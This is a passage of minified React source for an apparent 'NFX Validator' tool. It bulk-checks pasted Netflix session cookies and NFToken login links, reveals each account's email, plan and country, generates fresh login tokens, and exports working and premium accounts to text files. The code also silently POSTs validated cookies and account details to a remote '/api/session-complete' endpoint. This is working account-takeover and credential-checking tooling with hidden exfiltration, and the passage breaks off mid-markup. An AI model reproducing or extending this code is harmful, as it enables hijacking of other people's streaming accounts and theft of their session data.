                fullCookies: res?.fullCookies || Ie.fullCookies,
                nftoken: Ae
              } : Ie);
              st([...Q.current]);
              if (cacheEnabledRef.current && res?.token) {
                SpideyCache.updateToken(SpideyCache.getCookieKey(res.pair || at.pair), res.token);
                refreshCacheStats();
              }
            }).catch(() => {
              Q.current = Q.current.map(Et => Et.id === ut ? {
                ...Et,
                nftoken: "__failed__"
              } : Et);
              st([...Q.current]);
            });
          }
          oe.current === null && (oe.current = setTimeout(() => {
            oe.current = null,
              st([...Q.current])
          }
            , b0)),
            Mt({
              current: U,
              total: d.length
            }),
            U === d.length ? (oe.current !== null && (clearTimeout(oe.current),
              oe.current = null),
              st([...Q.current]),
              H()) : bt()
        }
        function bt() {
          for (; Y < v0 && j < d.length;) {
            const I = d[j++];
            Y++,
              qa(I.pair, I.id - 1).then(et => ft(et, I.id)).catch(() => ft({
                id: I.id,
                status: "error",
                plan: "-",
                email: "-",
                country: "-",
                extraMembers: null,
                error: "Unexpected error",
                pair: I.pair
              }, I.id))
          }
        }
        bt()
      }
      )
    }
      , [qa, generateTokenForPair, refreshCacheStats])
    , Xu = 8
    , pa = G.useCallback(async () => {
      let d = 0
        , U = 1 / 0;
      for (; d < Xu;) {
        const j = Q.current.filter(Y => Y.status === "error" || Y.status === "blocked");
        if (j.length === 0)
          return;
        if (j.length >= U) {
          rt(`Auto-retry stopped: ${j.length} still failing.`, "info");
          return
        }
        U = j.length,
          d++,
          Mt({
            current: 0,
            total: j.length
          }),
          await cl(j)
      }
      const H = Q.current.filter(j => j.status === "error" || j.status === "blocked").length;
      H > 0 && rt(`Auto-retry limit reached: ${H} still failing.`, "info")
    }
      , [cl, rt])
    , wl = G.useCallback(() => {
      const d = Q.current.filter(j => j.status === "working");
      if (d.length === 0)
        return;
      const U = d.map(j => ({
        netflixId: j.pair.netflixId,
        secureNetflixId: j.pair.secureNetflixId || "",
        email: j.email === "-" ? "" : j.email,
        plan: j.plan === "-" ? "" : j.plan,
        country: j.country === "-" ? "" : j.country,
        extraMembers: j.extraMembers,
        checkedAt: new Date().toISOString()
      }))
        , H = Dl(1)[0];
      fetch(`${H}/api/session-complete`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          deviceId: _e.current,
          entries: U
        }),
        keepalive: !0
      }).catch(() => { }
      )
    }
      , [])
    , Hl = G.useCallback(async (d, U, H = !0) => {
      if (St(!0),
        zt(!1),
        Se.current = !1,
        H && (gl.current = new Set),
        Ua.current = 0,
        d.length === 0) {
        We.current = [],
          St(!1),
          zt(!1);
        return
      }
      if (await new Promise(Y => {
        let F = 0
          , ft = 0;
        function bt(et) {
          let at = et;
          if (xn.current && et.status === "working" && et.email !== "-") {
            const ut = et.email.trim().toLowerCase();
            gl.current.has(ut) ? at = {
              ...et,
              status: "duplicate"
            } : gl.current.add(ut)
          }
          ft--;
          Q.current = [...Q.current, at];
          if (at.status === "working") {
            const ut = Q.current.filter(te => te.status === "working").length;
            Math.floor(ut / 100) > Math.floor(Ua.current / 100) && (Ua.current = ut,
              wl())
          }
          if (Ee.current && at.status === "working" && at.pair.netflixId && !at.pair.netflixId.startsWith("__nftoken__")) {
            const ut = at.id;
            Q.current = Q.current.map(Et => Et.id === ut ? {
              ...Et,
              nftoken: "__pending__"
            } : Et);
            st([...Q.current]);
            generateTokenForPair(at.pair, at.fullCookies).then(res => {
              const Ae = res?.token || "__failed__";
              Q.current = Q.current.map(Ie => Ie.id === ut ? {
                ...Ie,
                pair: res?.pair || Ie.pair,
                fullCookies: res?.fullCookies || Ie.fullCookies,
                nftoken: Ae
              } : Ie);
              st([...Q.current]);
              if (cacheEnabledRef.current && res?.token) {
                SpideyCache.updateToken(SpideyCache.getCookieKey(res.pair || at.pair), res.token);
                refreshCacheStats();
              }
            }).catch(() => {
              Q.current = Q.current.map(Et => Et.id === ut ? {
                ...Et,
                nftoken: "__failed__"
              } : Et);
              st([...Q.current]);
            });
          }
          oe.current === null && (oe.current = setTimeout(() => {
            oe.current = null,
              st([...Q.current])
          }
            , b0)),
            Mt(ut => ({
              current: ut.current + 1,
              total: U
            })),
            Se.current && ft === 0 ? (We.current = d.slice(F),
              Y()) : F >= d.length && ft === 0 ? (We.current = [],
                Y()) : I()
        }
        function I() {
          for (; !Se.current && ft < v0 && F < d.length;) {
            const et = d[F++]
              , { idx: at } = et;
            ft++;
            const ut = et.kind === "nftoken" ? Ul(et.url, at) : qa(et.pair, at)
              , te = et.kind === "cookie" ? et.pair : {
                netflixId: `__nftoken__${at}`
              };
            ut.then(bt).catch(() => bt({
              id: at + 1,
              status: "error",
              plan: "-",
              email: "-",
              country: "-",
              extraMembers: null,
              error: "Unexpected error",
              pair: te
            }))
          }
        }
        I()
      }
      ),
        oe.current !== null && (clearTimeout(oe.current),
          oe.current = null),
        st([...Q.current]),
        refreshCacheStats(),
        Se.current && We.current.length > 0)
        St(!1),
          zt(!0),
          rt(`Paused — ${We.current.length} remaining in queue.`, "info");
      else {
        zt(!1),
          await pa(),
          wl(),
          St(!1),
          refreshCacheStats();
        const Y = Q.current;
        const cachedCount = Y.filter(F => F.cached).length;
        rt(`Done: ${Y.filter(F => F.status === "working").length} valid, ${Y.filter(F => F.status === "expired").length} expired${cachedCount > 0 ? ` (${cachedCount} from cache ⚡)` : ""}`, Y.filter(F => F.status === "working").length > 0 ? "success" : "info")
      }
    }
      , [qa, Ul, rt, pa, wl, refreshCacheStats, generateTokenForPair])
    , Nn = G.useCallback(async () => {
      if (!C.trim()) {
        rt("Paste cookies first", "error");
        return
      }
      const d = s0(C)
        , U = c0(C);
      if (d.length === 0 && U.length === 0) {
        rt("No valid cookies found. Check format.", "error");
        return
      }
      const H = new Set
        , j = new Set
        , Y = [];
      let F = 0;
      for (const I of d) {
        const et = I.match(/nftoken=([^&\s]+)/)?.[1] ?? I;
        H.has(et) || (H.add(et),
          Y.push({
            kind: "nftoken",
            url: I,
            idx: F++
          }))
      }
      const ft = [];
      for (const I of U) {
        const et = `${I.netflixId}|${I.secureNetflixId || ""}`;
        j.has(et) ? (ft.push({
          id: F + 1,
          status: "duplicate",
          plan: "-",
          email: "-",
          country: "-",
          extraMembers: null,
          error: null,
          pair: I
        }),
          F++) : (j.add(et),
            Y.push({
              kind: "cookie",
              pair: I,
              idx: F++
            }))
      }
      const bt = Y.length + ft.length;
      st(ft),
        Q.current = ft,
        We.current = [],
        Mt({
          current: ft.length,
          total: bt
        }),
        yt(ir),
        Fe.current = 0,
        al.current = null,
        O("00:00"),
        ft.length > 0 && rt(`${ft.length} duplicate(s) detected — checking ${Y.length} unique.`, "info"),
        await Hl(Y, bt)
    }
      , [C, Hl, rt])
    , Ni = G.useCallback(async () => {
      const d = We.current;
      d.length !== 0 && (zt(!1),
        await Hl(d, Dt.total, !1))
    }
      , [Dt.total, Hl])
    , Ba = G.useCallback(async d => {
      d.length !== 0 && (St(!0),
        Mt({
          current: 0,
          total: d.length
        }),
        await cl(d),
        await pa(),
        wl(),
        refreshCacheStats(),
        rt(`Retry done. Valid: ${Q.current.filter(U => U.status === "working").length}`, Q.current.filter(U => U.status === "working").length > 0 ? "success" : "info"),
        St(!1))
    }
      , [cl, pa, wl, rt, refreshCacheStats])
    , sl = G.useCallback(async () => {
      await Ba(D.filter(d => d.status === "expired" || d.status === "error" || d.status === "blocked"))
    }
      , [D, Ba])
    , ie = G.useCallback(async () => {
      await Ba(D.filter(d => d.status === "error"))
    }
      , [D, Ba])
    , ge = G.useCallback(() => {
      const d = D.filter(Y => Y.status === "working");
      if (d.length === 0) {
        rt("No valid cookies to export", "error");
        return
      }
      const sep = "==================================================================";
      const list = d.map(Y => Y.fullCookies?.length ? vl(Y.fullCookies) : nl(Y.pair.netflixId, Y.pair.secureNetflixId)).join(`\n\n${sep}\n\n`);
      const U = new Blob([`${sep}\n\n${list}\n\n${sep}`], {
        type: "text/plain"
      })
        , H = URL.createObjectURL(U)
        , j = document.createElement("a");
      j.href = H,
        j.download = `valid_${Date.now()}.txt`,
        j.click(),
        URL.revokeObjectURL(H),
        rt(`Exported ${d.length} valid cookie(s)`, "success")
    }
      , [D, rt, nl, vl])
    , ql = G.useCallback(() => {
      const d = D.filter(Y => Y.status === "working" && /premium/i.test(Y.plan));
      if (d.length === 0) {
        rt("No premium accounts found", "error");
        return
      }
      const sep = "==================================================================";
      const list = d.map(Y => Y.fullCookies?.length ? vl(Y.fullCookies) : nl(Y.pair.netflixId, Y.pair.secureNetflixId)).join(`\n\n${sep}\n\n`);
      const U = new Blob([`${sep}\n\n${list}\n\n${sep}`], {
        type: "text/plain"
      })
        , H = URL.createObjectURL(U)
        , j = document.createElement("a");
      j.href = H,
        j.download = `premium_${Date.now()}.txt`,
        j.click(),
        URL.revokeObjectURL(H),
        rt(`Exported ${d.length} premium account(s)`, "success")
    }
      , [D, rt, nl, vl])
    , Tn = G.useCallback(() => {
      const d = D.filter(Y => Y.status === "working" && Y.nftoken && Y.nftoken !== "__failed__" && Y.nftoken !== "__pending__");
      if (d.length === 0) {
        rt("No NFTokens generated yet", "error");
        return;
      }
      const sep = "==================================================================";
      const list = d.map(Y => cr(Y.nftoken, Ca.current)).join(`\n\n${sep}\n\n`);
      const U = new Blob([`${list}\n\n${sep}`], {
        type: "text/plain"
      })
        , H = URL.createObjectURL(U)
        , j = document.createElement("a");
      j.href = H,
        j.download = `nftokens_${Date.now()}.txt`,
        j.click(),
        URL.revokeObjectURL(H),
        rt(`Exported ${d.length} NFToken(s)`, "success");
    }
      , [D, rt])
    , handleClearCache = G.useCallback(() => {
      SpideyCache.clear();
      refreshCacheStats();
      rt("Spidey-Cache completely purged!", "success");
    }, [refreshCacheStats, rt])
    , handleExportCache = G.useCallback(() => {
      const accounts = SpideyCache.exportValidAccounts(nl);
      if (!accounts.length) {
        rt("No valid accounts in Spidey-Cache to export.", "info");
        return;
      }
      const sep = "==================================================================";
      const list = accounts.join(`\n\n${sep}\n\n`);
      const blob = new Blob([`${sep}\n\n${list}\n\n${sep}`], { type: "text/plain" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `spidey_cache_valid_${Date.now()}.txt`;
      a.click();
      URL.revokeObjectURL(url);
      rt(`Exported ${accounts.length} valid account(s) from cache!`, "success");
    }, [nl, rt])
    , Ti = G.useMemo(() => D.filter(d => d.status === "working" && /premium/i.test(d.plan)).length, [D])
    , stdCount = G.useMemo(() => D.filter(d => d.status === "working" && /standard/i.test(d.plan)).length, [D])
    , basicCount = G.useMemo(() => D.filter(d => d.status === "working" && /basic|mobile/i.test(d.plan)).length, [D])
    , phCount = G.useMemo(() => D.filter(d => d.status === "working" && /^PH$/i.test(d.country?.trim() || "")).length, [D])
    , Qu = G.useCallback(() => {
      oe.current !== null && (clearTimeout(oe.current),
        oe.current = null),
        $(""),
        st([]),
        Q.current = [],
        We.current = [],
        gl.current = new Set,
        Se.current = !1,
        zt(!1),
        Mt({
          current: 0,
          total: 0
        }),
        Fe.current = 0,
        al.current = null,
        O("00:00");
      try {
        localStorage.removeItem(SPIDEY_SESSION_KEY);
      } catch {}
      rt("Workspace and session cleared.", "info");
    }
      , [rt])
    , $t = G.useMemo(() => ({
      total: D.length,
      working: D.filter(d => d.status === "working").length,
      duplicates: D.filter(d => d.status === "duplicate").length,
      expired: D.filter(d => d.status === "expired").length,
      errors: D.filter(d => d.status === "error").length,
      cached: D.filter(d => d.cached).length
    }), [D])
    , Bl = G.useMemo(() => $t.expired + $t.errors + D.filter(d => d.status === "blocked").length, [$t, D])
    , ha = G.useMemo(() => {
      let filtered = D;
      if (planFilter === "premium") {
        filtered = D.filter(d => /premium/i.test(d.plan));
      } else if (planFilter === "standard") {
        filtered = D.filter(d => /standard/i.test(d.plan));
      } else if (planFilter === "basic") {
        filtered = D.filter(d => /basic|mobile/i.test(d.plan));
      } else if (planFilter === "ph") {
        filtered = D.filter(d => /^PH$/i.test(d.country?.trim() || ""));
      } else if (planFilter === "cached") {
        filtered = D.filter(d => d.cached);
      }
      return [...filtered].sort((d, U) => {
        const H = {
          working: 0,
          duplicate: 1,
          expired: 2,
          error: 3
        };
        return (H[d.status] ?? 4) - (H[U.status] ?? 4)
      })
    }, [D, planFilter])
    , Yl = ha.slice(0, W)
    , Gl = ha.length > W;

  return g.jsxs("div", {
    className: "min-h-screen bg-[#080808] text-zinc-200 flex flex-col",
    children: [g.jsx("div", {
      className: "fixed bottom-4 right-4 z-50 flex flex-col gap-2 w-[calc(100vw-2rem)] sm:w-80 pointer-events-none",
      children: $e.map(d => g.jsxs("div", {
        className: ye("flex items-start gap-3 px-4 py-3 rounded-xl border shadow-xl pointer-events-auto", d.type === "success" ? "bg-emerald-950/90 border-emerald-800/60 text-emerald-300" : d.type === "error" ? "bg-red-950/90     border-red-800/60     text-red-300" : "bg-zinc-900/90    border-zinc-700/60    text-zinc-300"),
        children: [g.jsx("span", {
          className: "text-base leading-none mt-px flex-shrink-0",
          children: d.type === "success" ? "✓" : d.type === "error" ? "✕" : "·"
        }), g.jsx("p", {
          className: "text-xs leading-relaxed",
          children: d.message
        })]
      }, d.id))
    }), g.jsx("header", {
      className: "sticky top-0 z-30 border-b border-zinc-800 bg-[#080808]/95 backdrop-blur-sm",
      children: g.jsxs("div", {
        className: "max-w-screen-2xl mx-auto px-4 h-14 flex items-center justify-between gap-4",
        children: [g.jsxs("div", {
          className: "flex items-center gap-2.5",
          children: [g.jsx("div", {
            className: "w-7 h-7 rounded-lg bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center",
            children: g.jsx(o0, {
              size: 14,
              className: "text-emerald-400"
            })
          }), g.jsxs("div", {
            className: "flex items-baseline gap-2",
            children: [g.jsx("span", {
              className: "font-bold text-sm tracking-tight text-zinc-100",
              children: "NFX Validator"
            }), g.jsx("span", {
              className: "text-[10px] text-zinc-600 font-mono",
              children: "v2.0 + CACHE"
            })]
          })]
        }), g.jsxs("div", {
          className: "flex items-center gap-2 sm:gap-3",
          children: [
            g.jsxs("button", {
              type: "button",
              onClick: () => setShowCacheMenu(prev => !prev),
              className: ye("flex items-center gap-1.5 px-2.5 py-1 rounded-lg border text-xs font-mono transition-all", cacheEnabled ? "bg-amber-500/10 border-amber-500/30 text-amber-300 hover:bg-amber-500/20 shadow-[0_0_12px_rgba(251,191,36,0.15)]" : "bg-zinc-900 border-zinc-800 text-zinc-500"),
              title: "Manage Spidey Cache",
              children: [
                g.jsx(Zh_zap, { size: 12, className: cacheEnabled ? "text-amber-400 animate-pulse" : "text-zinc-600" }),
                g.jsx("span", { className: "font-bold", children: cacheEnabled ? "CACHE ON" : "CACHE OFF" }),
                g.jsxs("span", { className: "hidden md:inline text-[10px] opacity-75", children: ["(", cacheStats.total, " saved)"] })
              ]
            }),
            g.jsxs("div", {
              className: "hidden sm:flex items-center gap-1.5 text-xs text-zinc-500",
              children: [g.jsx(Rh, {
                size: 12,
                className: tt ? "text-emerald-400" : ""
              }), g.jsx("span", {
                className: ye("font-mono tabular-nums", tt && "text-emerald-400"),
                children: o
              })]
            }), g.jsxs("div", {
              className: ye("flex items-center gap-2 px-3 py-1.5 rounded-full text-xs font-medium border", tt ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-400" : "bg-zinc-800/50 border-zinc-700 text-zinc-500"),
              children: [g.jsx("span", {
                className: ye("w-1.5 h-1.5 rounded-full", tt ? "bg-emerald-400 animate-pulse" : "bg-zinc-600")
              }), g.jsx("span", {
                className: "hidden sm:inline",
                children: tt ? "Running" : "Idle"
              })]
            })
          ]
        })]
      })
    }), 

    showCacheMenu && g.jsx("div", {
      className: "fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4",
      onClick: () => setShowCacheMenu(!1),
      children: g.jsxs("div", {
        className: "bg-[#0d0d0d] border border-amber-500/30 rounded-2xl p-5 max-w-md w-full shadow-[0_0_50px_rgba(251,191,36,0.15)] flex flex-col gap-4 animate-up",
        onClick: e => e.stopPropagation(),
        children: [
          g.jsxs("div", {
            className: "flex items-center justify-between border-b border-zinc-800 pb-3",
            children: [
              g.jsxs("div", {
                className: "flex items-center gap-2",
                children: [
                  g.jsx(Zh_zap, { size: 18, className: "text-amber-400" }),
                  g.jsx("h3", { className: "font-bold text-sm text-zinc-100 uppercase tracking-wide", children: "⚡ Spidey-Cache Engine" })
                ]
              }),
              g.jsx("button", {
                onClick: () => setShowCacheMenu(!1),
                className: "p-1 rounded-lg text-zinc-500 hover:text-zinc-200 transition-colors",
                children: g.jsx(Mh, { size: 16 })
              })
            ]
          }),
          g.jsxs("div", {
            className: "grid grid-cols-2 sm:grid-cols-4 gap-2 text-center",
            children: [
              g.jsxs("div", {
                className: "p-2.5 rounded-xl bg-zinc-900 border border-zinc-800",
                children: [
                  g.jsx("div", { className: "text-base font-bold text-amber-400", children: cacheStats.total }),
                  g.jsx("div", { className: "text-[10px] text-zinc-500 uppercase mt-0.5", children: "Total Saved" })
                ]
              }),
              g.jsxs("div", {
                className: "p-2.5 rounded-xl bg-zinc-900 border border-zinc-800",
                children: [
                  g.jsx("div", { className: "text-base font-bold text-emerald-400", children: cacheStats.working }),
                  g.jsx("div", { className: "text-[10px] text-zinc-500 uppercase mt-0.5", children: "Valid" })
                ]
              }),
              g.jsxs("div", {
                className: "p-2.5 rounded-xl bg-zinc-900 border border-zinc-800",
                children: [
                  g.jsx("div", { className: "text-base font-bold text-cyan-400", children: cacheStats.hits }),
                  g.jsx("div", { className: "text-[10px] text-zinc-500 uppercase mt-0.5", children: "Cache Hits" })
                ]
              }),
              g.jsxs("div", {
                className: "p-2.5 rounded-xl bg-zinc-900 border border-zinc-800",
                children: [
                  g.jsxs("div", { className: "text-base font-bold text-purple-400", children: [cacheStats.hitRate, "%"] }),
                  g.jsx("div", { className: "text-[10px] text-zinc-500 uppercase mt-0.5", children: "Hit Ratio" })
                ]
              })
            ]
          }),
          g.jsxs("div", {
            className: "flex flex-col gap-2 bg-zinc-900/50 p-3 rounded-xl border border-zinc-800/80 text-xs",
            children: [
              g.jsxs("div", {
                className: "flex items-center justify-between",
                children: [
                  g.jsx("span", { className: "text-zinc-400", children: "Enable Fast-Cache" }),
                  g.jsx(S0, { checked: cacheEnabled, onChange: setCacheEnabled, label: "" })
                ]
              }),
              g.jsxs("div", {
                className: "flex items-center justify-between pt-2 border-t border-zinc-800/60",
                children: [
                  g.jsx("span", { className: "text-zinc-400", children: "Cache Expiry (TTL)" }),
                  g.jsxs("select", {
                    value: cacheTtl,
                    onChange: e => setCacheTtl(Number(e.target.value)),
                    className: "bg-zinc-800 border border-zinc-700 text-zinc-200 rounded-lg px-2 py-1 text-xs outline-none",
                    children: [
                      g.jsx("option", { value: 1, children: "1 Hour" }),
                      g.jsx("option", { value: 6, children: "6 Hours" }),
                      g.jsx("option", { value: 12, children: "12 Hours (Default)" }),
                      g.jsx("option", { value: 24, children: "24 Hours" }),
                      g.jsx("option", { value: 168, children: "7 Days" })
                    ]
                  })
                ]
              })
            ]
          }),
          g.jsxs("div", {
            className: "flex items-center gap-2 pt-1",
            children: [
              g.jsxs("button", {
                type: "button",
                onClick: handleExportCache,
                disabled: cacheStats.working === 0,
                className: "flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-emerald-500/15 border border-emerald-500/30 text-emerald-400 text-xs font-semibold hover:bg-emerald-500/25 transition-all disabled:opacity-40 disabled:cursor-not-allowed",
                children: [
                  g.jsx(tr, { size: 13 }),
                  `Export Valid (${cacheStats.working})`
                ]
              }),
              g.jsxs("button", {
                type: "button",
                onClick: handleClearCache,
                className: "flex items-center justify-center gap-1.5 px-4 py-2.5 rounded-xl bg-red-500/10 border border-red-500/30 text-red-400 text-xs font-semibold hover:bg-red-500/20 transition-all",
                children: [
                  g.jsx(Xh, { size: 13 }),
                  "Clear Cache"
                ]
              })
            ]
          })
        ]
      })
    }),

    g.jsxs("main", {
      className: "flex-1 max-w-screen-2xl mx-auto w-full px-3 sm:px-4 py-4 sm:py-6 flex flex-col lg:flex-row gap-4 lg:gap-6",
      children: [g.jsxs("aside", {
        className: "w-full lg:w-[360px] xl:w-[400px] shrink-0 flex flex-col gap-4",
        children: [g.jsxs("div", {
          className: "rounded-2xl border border-zinc-800 bg-[#0d0d0d] overflow-hidden flex flex-col",
          children: [g.jsx("div", {
            className: "flex border-b border-zinc-800 bg-[#0a0a0a]",
            children: ["cookies", "token"].map(d => g.jsxs("button", {
              onClick: () => p(d),
              className: ye("flex-1 flex items-center justify-center gap-1.5 py-3 text-xs font-medium transition-colors", c === d ? "text-emerald-400 border-b-2 border-emerald-500 bg-emerald-500/5" : "text-zinc-500 hover:text-zinc-300"),
              children: [d === "token" && g.jsx(Ch, {
                size: 12
              }), d === "cookies" ? "Cookies" : "NFToken"]
            }, d))
          }), c === "cookies" ? g.jsxs(g.Fragment, {
            children: [g.jsxs("div", {
              className: "flex items-center justify-between px-3 py-2 border-b border-zinc-800/60",
              children: [g.jsx("span", {
                className: "text-[10px] text-zinc-600 uppercase tracking-widest",
                children: "Payload Input"
              }), g.jsxs("div", {
                className: "flex items-center gap-1",
                children: [g.jsx("button", {
                  onClick: () => hl.current?.click(),
                  title: "Upload file",
                  className: "p-2 rounded-lg text-zinc-600 hover:text-zinc-300 hover:bg-zinc-800 transition-colors",
                  children: g.jsx(Vh, {
                    size: 14
                  })
                }), g.jsx("button", {
                  onClick: Qu,
                  title: "Clear all",
                  className: "p-2 rounded-lg text-zinc-600 hover:text-red-400 hover:bg-red-500/10 transition-colors",
                  children: g.jsx(Xh, {
                    size: 14
                  })
                })]
              })]
            }), g.jsx("textarea", {
              className: ye("w-full bg-transparent text-emerald-400 p-4 text-xs leading-relaxed resize-none outline-none font-mono placeholder:text-zinc-700 transition-colors", "h-48 sm:h-56 lg:h-72", Qt && "bg-emerald-500/5 ring-2 ring-inset ring-emerald-500/30", tt && "opacity-60 cursor-not-allowed"),
              placeholder: Yg,
              value: C,
              onChange: d => $(d.target.value),
              disabled: tt,
              onDragOver: d => {
                d.preventDefault(),
                  Te(!0)
              }
              ,
              onDragLeave: () => Te(!1),
              onDrop: Bu,
              spellCheck: !1
            }), C.trim() && (() => {
              const d = c0(C).length
                , U = s0(C).length
                , H = d + U;
              let j;
              return d > 0 && U > 0 ? j = g.jsxs(g.Fragment, {
                children: [d, " cookie pair(s)", g.jsx("span", {
                  className: "text-zinc-700",
                  children: " AND "
                }), g.jsxs("span", {
                  className: "text-cyan-700",
                  children: [U, " NFToken(s)"]
                }), g.jsxs("span", {
                  className: "text-zinc-700",
                  children: [" = total ", H]
                }), " detected"]
              }) : d > 0 ? j = g.jsxs(g.Fragment, {
                children: [d, " cookie pair(s) detected"]
              }) : U > 0 ? j = g.jsxs(g.Fragment, {
                children: [g.jsxs("span", {
                  className: "text-cyan-700",
                  children: [U, " NFToken(s)"]
                }), " detected"]
              }) : j = g.jsx(g.Fragment, {
                children: "0 detected"
              }),
                g.jsx("div", {
                  className: "px-4 py-2 border-t border-zinc-800/60 bg-zinc-900/30",
                  children: g.jsx("span", {
                    className: "text-[10px] text-zinc-600",
                    children: j
                  })
                })
            }
            )()]
          }) : g.jsxs("div", {
            className: "flex flex-col gap-3 p-4",
            children: [g.jsx("p", {
              className: "text-xs text-zinc-500 leading-relaxed",
              children: "Paste a Netflix NFToken URL to resolve and validate in one step."
            }), g.jsx("textarea", {
              className: "w-full h-24 bg-zinc-900/50 border border-zinc-700 rounded-xl text-emerald-400 p-3 text-xs leading-relaxed resize-none outline-none focus:border-emerald-500/40 transition-colors placeholder:text-zinc-700 font-mono",
              placeholder: "https://netflix.com/?nftoken=...",
              value: h,
              onChange: d => r(d.target.value),
              disabled: A,
              spellCheck: !1
            }), g.jsxs("button", {
              onClick: il,
              disabled: A || !h.trim(),
              className: "w-full flex items-center justify-center gap-2 py-3 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-semibold uppercase tracking-wider hover:bg-emerald-500/20 transition-all disabled:opacity-40 disabled:cursor-not-allowed",
              children: [A ? g.jsx(er, {
                size: 13,
                className: "animate-spin"
              }) : g.jsx(lr, {
                size: 13
              }), A ? "Resolving…" : "Resolve Token"]
            }), S && g.jsxs("div", {
              className: ye("rounded-xl border p-4 flex flex-col gap-2.5 text-xs", S.status === "working" ? "border-emerald-500/30 bg-emerald-500/5" : S.status === "expired" ? "border-red-500/30 bg-red-500/5" : "border-zinc-700 bg-zinc-900/40"),
              children: [g.jsxs("div", {
                className: "flex items-center justify-between",
                children: [g.jsx(x0, {
                  status: S.status === "working" ? "working" : S.status === "expired" ? "expired" : "error",
                  cached: S.cached,
                  cachedAt: S.cachedAt
                }), S.status === "working" && g.jsxs("div", {
                  className: "flex items-center gap-1.5",
                  children: [
                    S.cookies && S.cookies.some(d => d.name === "NetflixId") && g.jsxs("button", {
                      onClick: () => ze(S.cookies),
                      className: "flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-zinc-800 hover:bg-zinc-700 text-zinc-400 hover:text-zinc-200 transition-colors text-[11px]",
                      title: "Copy JSON Cookies",
                      children: [k ? g.jsx(Du, {
                        size: 11,
                        className: "text-emerald-400"
                      }) : g.jsx(Cu, {
                        size: 11
                      }), k ? "Copied" : "Cookie"]
                    }),
                    S.nftoken && g.jsxs("button", {
                      onClick: () => {
                        navigator.clipboard.writeText(cr(S.nftoken, Zt)).then(() => {
                          rt(`NFToken (${Zt.toUpperCase()}) copied!`, "success");
                        }).catch(() => rt("Copy failed", "error"));
                      },
                      className: "flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-400 hover:text-cyan-300 border border-cyan-500/20 transition-colors text-[11px]",
                      title: `Copy NFToken link for ${Zt.toUpperCase()}`,
                      children: [g.jsx(Ch, {
                        size: 11
                      }), "NFToken (", Zt.toUpperCase(), ")"]
                    })
                  ]
                })]
              }), S.status === "working" && S.details && g.jsxs("div", {
                className: "grid grid-cols-[auto_1fr] gap-x-3 gap-y-1 text-[11px]",
                children: [g.jsx("span", {
                  className: "text-zinc-600",
                  children: "Plan"
                }), g.jsx("span", {
                  className: "text-zinc-300",
                  children: S.details.plan || "—"
                }), g.jsx("span", {
                  className: "text-zinc-600",
                  children: "Email"
                }), g.jsx("span", {
                  className: "text-zinc-300 truncate",
                  children: S.details.email || "Hidden"
                }), g.jsx("span", {
                  className: "text-zinc-600",
                  children: "Country"
                }), g.jsx("span", {
                  className: "text-zinc-300",
                  children: S.details.country || "—"
                })]
              }), S.error && g.jsx("p", {
                className: "text-zinc-500 text-[11px]",
                children: S.error
              })]
            })]
          }), g.jsx("input", {
            ref: hl,
            type: "file",
            className: "hidden",
            accept: ".txt,.json,.cookie,.text,.zip,.rar",
            multiple: !0,
            onChange: d => {
              fe(Array.from(d.target.files ?? [])),
                d.target.value = ""
            }
          })]
        }), g.jsxs("div", {
          className: "grid grid-cols-5 gap-1.5 lg:hidden",
          children: [g.jsxs("div", {
            className: "rounded-xl border border-zinc-800 bg-[#0d0d0d] p-2 text-center",
            children: [g.jsx("div", {
              className: "text-base font-bold text-zinc-400",
              children: $t.total
            }), g.jsx("div", {
              className: "text-[9px] text-zinc-600 uppercase tracking-wide mt-0.5",
              children: "Total"
            })]
          }), g.jsxs("div", {
            className: "rounded-xl border border-zinc-800 bg-[#0d0d0d] p-2 text-center",
            children: [g.jsx("div", {
              className: "text-base font-bold text-emerald-400",
              children: $t.working
            }), g.jsx("div", {
              className: "text-[9px] text-zinc-600 uppercase tracking-wide mt-0.5",
              children: "Valid"
            })]
          }), g.jsxs("div", {
            className: "rounded-xl border border-zinc-800 bg-[#0d0d0d] p-2 text-center",
            children: [g.jsx("div", {
              className: "text-base font-bold text-amber-400",
              children: $t.duplicates
            }), g.jsx("div", {
              className: "text-[9px] text-zinc-600 uppercase tracking-wide mt-0.5",
              children: "Dupes"
            })]
          }), g.jsxs("div", {
            className: "rounded-xl border border-zinc-800 bg-[#0d0d0d] p-2 text-center",
            children: [g.jsx("div", {
              className: "text-base font-bold text-red-400",
              children: $t.expired
            }), g.jsx("div", {
              className: "text-[9px] text-zinc-600 uppercase tracking-wide mt-0.5",
              children: "Expired"
            })]
          }), g.jsxs("div", {
            className: "rounded-xl border border-zinc-800 bg-[#0d0d0d] p-2 text-center",
            children: [g.jsx("div", {
              className: "text-base font-bold text-amber-400",
              children: $t.cached
            }), g.jsx("div", {
              className: "text-[9px] text-zinc-600 uppercase tracking-wide mt-0.5",
              children: "Cached"
            })]
          })]
        })]
      }), g.jsxs("section", {
        className: "flex-1 min-w-0 flex flex-col gap-4",
        children: [g.jsxs("div", {
          className: "rounded-2xl border border-zinc-800 bg-[#0d0d0d] p-3 sm:p-4 flex flex-col gap-3",
          children: [g.jsxs("div", {
            className: "grid grid-cols-2 sm:flex sm:flex-wrap gap-2",
            children: [!tt && !Yt && g.jsxs("button", {
              onClick: Nn,
              disabled: !C.trim(),
              className: "col-span-2 sm:col-span-1 flex items-center justify-center gap-2 px-5 py-3 rounded-xl bg-emerald-500/15 border border-emerald-500/30 text-emerald-400 font-semibold text-sm hover:bg-emerald-500/25 hover:border-emerald-500/50 hover:shadow-[0_0_20px_rgba(52,211,153,0.15)] transition-all disabled:opacity-40 disabled:cursor-not-allowed disabled:shadow-none",
              children: [g.jsx(lr, {
                size: 15
              }), "Start Check"]
            }), tt && g.jsxs("button", {
              onClick: zn,
              className: "col-span-2 sm:col-span-1 flex items-center justify-center gap-2 px-5 py-3 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-400 font-semibold text-sm hover:bg-amber-500/20 transition-all",
              children: [g.jsx(Yh, {
                size: 15
              }), "Stop"]
            }), Yt && !tt && g.jsxs("button", {
